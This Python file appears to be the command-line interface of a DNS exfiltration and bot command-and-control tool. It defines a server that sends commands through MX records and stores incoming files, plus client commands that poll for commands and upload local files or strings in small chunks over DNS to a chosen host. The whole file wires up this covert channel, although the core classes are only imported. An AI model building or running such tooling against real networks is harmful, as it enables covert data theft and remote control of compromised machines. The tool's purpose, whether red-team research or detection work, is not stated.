from dns_exfil.exfiltrators.botexfiltrator.client import BotClient
from dns_exfil.exfiltrators.botexfiltrator.server import BotExfiltrator
from dns_exfil.exfiltrators.base.server import start_server
from dns_exfil import config

import click


@click.command()
@click.option('--domain', default=config['server']['botexfiltrator']['domain'],
              help='spoof Domain name to use in server responses')
@click.option('--ip', default=config['server']['botexfiltrator']['ip'],
              help='spoof IP address to use in server responses')
@click.option('--cmd', default=config['server']['botexfiltrator']['cmd'],
              help='File for sending commands through MX records')
@click.option('--basedir', default=config['server']['botexfiltrator']['basedir'],
              help='Where the files should be saved')
def bot(domain, ip, cmd, basedir):
    context = config['server']['botexfiltrator']
    context.update(locals())
    start_server(BotExfiltrator())

@click.command(name='poll')
@click.option('--domain', default='example.com', help='ending domain name')
@click.argument('connect')
def bot_poll(domain, connect):
    client = BotClient(domain, connect)
    client.bot()

@click.command(name='append_file')
@click.option('--domain', default='example.com', help='ending domain name')
@click.option('--chunk_size', help='size in bytes to transfer in each packet', default=30, type=int)
@click.argument('connect')
@click.argument('filename')
def bot_append_file(domain, chunk_size, connect, filename):
    client = BotClient(domain, connect)
    client.append_file(filename, chunk_size)

@click.command(name='append')
@click.option('--domain', default='example.com', help='ending domain name')
@click.option('--chunk_size', help='size in bytes to transfer in each packet', default=30, type=int)
@click.argument('connect')
@click.argument('filename')
@click.argument('string')
def bot_append(domain, chunk_size, connect, filename, string):
    string += '\n'
    client = BotClient(domain, connect)
    client.append(string.encode('utf-8'), filename)


@click.group(name='bot')
def bot_client():
    pass

bot_client.add_command(bot_poll)
bot_client.add_command(bot_append_file)
bot_client.add_command(bot_append)

